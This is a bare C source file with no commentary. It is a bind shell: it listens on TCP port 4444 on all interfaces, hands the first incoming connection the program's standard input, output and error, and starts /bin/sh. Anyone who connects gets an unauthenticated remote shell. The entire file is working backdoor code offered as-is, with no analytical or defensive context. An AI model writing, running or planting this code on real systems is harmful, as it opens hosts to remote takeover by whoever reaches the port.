/*
 *
 */

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
  int s, c;
  unsigned short port = 4444;
  struct sockaddr_in addr;

  s = socket(AF_INET, SOCK_STREAM, 0);

  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = INADDR_ANY;

  bind(s, (struct sockaddr*)&addr, sizeof(addr));
  listen(s, 0);

  c = accept(s, NULL, NULL);

  dup2(c, STDERR_FILENO);
  dup2(c, STDOUT_FILENO);
  dup2(c, STDIN_FILENO);

  execve("/bin/sh", NULL, NULL);

  return 0;
}
